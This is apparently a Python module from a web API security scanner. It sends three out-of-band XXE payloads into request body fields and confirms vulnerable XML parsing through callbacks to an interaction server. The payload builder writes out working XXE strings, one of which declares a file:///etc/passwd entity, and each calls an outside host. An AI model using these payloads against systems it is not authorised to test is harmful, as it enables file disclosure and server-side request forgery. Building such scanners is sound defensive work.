"""Full XXE confirmation (premium): out-of-band XML external entities.

The free ``oob_injection`` check carries a single basic external-entity XXE
payload and its own docstring calls that "partial" — true XXE needs richer
payloads. This premium check injects three out-of-band XXE variants and confirms
them the same way: an OAST callback proves the target parsed attacker-controlled
XML and resolved the entity, not merely that a marker reflected.

Variants:

- **external entity** — the classic ``<!ENTITY e SYSTEM "…">`` OOB fetch.
- **parameter entity** — an external DTD pulled in via ``%dtd;`` (blind, no body
  reflection).
- **external DTD with a file declaration** — proves DTD resolution only. The
  historical ``blind_exfil`` family key is retained for finding identity; a
  callback does not prove that a file was read or exfiltrated.

Because an XML body is a write to a mutating verb, it is also gated on
``mutate: true`` (the body is injected into a POST/PUT/PATCH field), on top of
``premium: true`` and an active OAST server.
"""
from __future__ import annotations

import uuid

from app.domain.enums import Confidence, Severity
from app.engine.base import EngineFinding, ScanContext, render_path
from app.engine.resource_map import path_values

# family -> (label, severity)
_FAMILIES: list[tuple[str, str, Severity]] = [
    ("external_entity", "XXE external entity", Severity.high),
    ("parameter_entity", "XXE parameter entity", Severity.high),
    ("blind_exfil", "XXE external DTD resolution", Severity.high),
]


def _payload_for(family: str, url: str) -> str:
    """An out-of-band XXE payload embedding ``url`` as the entity target."""
    if family == "parameter_entity":
        return (
            '<?xml version="1.0"?><!DOCTYPE x '
            f'[<!ENTITY % dtd SYSTEM "{url}"> %dtd;]><x/>'
        )
    if family == "blind_exfil":
        return (
            '<?xml version="1.0"?><!DOCTYPE x '
            '[<!ENTITY % file SYSTEM "file:///etc/passwd"> '
            f'<!ENTITY % dtd SYSTEM "{url}"> %dtd;]><x/>'
        )
    return (
        '<?xml version="1.0"?><!DOCTYPE x '
        f'[<!ENTITY e SYSTEM "{url}">]><x>&e;</x>'
    )


class XxeConfirmationCheck:
    key = "xxe_confirmation"
    #: Premium: reserved for the paid tier, off unless ``premium: true``.
    premium = True

    def run(self, ctx: ScanContext) -> list[EngineFinding]:
        if not ctx.premium or not ctx.allow_mutation or not getattr(ctx.oob, "active", False):
            return []

        headers = ctx.primary_headers()
        # token -> (op, field, family, label, severity, payload)
        pending: dict[str, tuple] = {}

        for op in ctx.operations:
            if op.method not in ("POST", "PUT", "PATCH") or not op.body_params:
                continue
            path = render_path(op.path, path_values(op, ctx.resource_ids))
            field = op.body_params[0]
            for family, label, severity in _FAMILIES:
                token = "x" + uuid.uuid4().hex[:16]
                url = ctx.oob.payload_url(token)
                if not url:
                    return self._collect(ctx, pending)
                payload = _payload_for(family, url)
                r = ctx.probe.send(op.method, path, headers=headers, json={field: payload})
                if r is None:
                    return self._collect(ctx, pending)  # budget spent
                pending[token] = (op, field, family, label, severity, payload)

        return self._collect(ctx, pending)

    def _collect(self, ctx, pending) -> list[EngineFinding]:
        findings: list[EngineFinding] = []
        for interaction in ctx.oob.poll():
            meta = pending.get(interaction.token)
            if meta is None:
                continue
            op, field, family, label, severity, payload = meta
            findings.append(
                EngineFinding(
                    check=self.key,
                    confidence=Confidence.verified,
                    owasp_id="CWE-74",
                    severity=severity,
                    title=f"{label} confirmed via '{field}' on {op.method} {op.path}",
                    description=(
                        f"An out-of-band {interaction.protocol.upper()} callback proved "
                        f"the target parsed attacker-controlled XML and resolved the "
                        f"external entity after '{field}' was injected — a confirmed {label}."
                    ),
                    evidence={
                        "method": op.method,
                        "route": op.path,
                        "field": field,
                        "family": family,
                        "payload": payload,
                        "oob_protocol": interaction.protocol,
                        "oob_source_ip": interaction.source_ip,
                        "oob_token": interaction.token,
                    },
                    operation_id=op.id,
                )
            )
        return findings
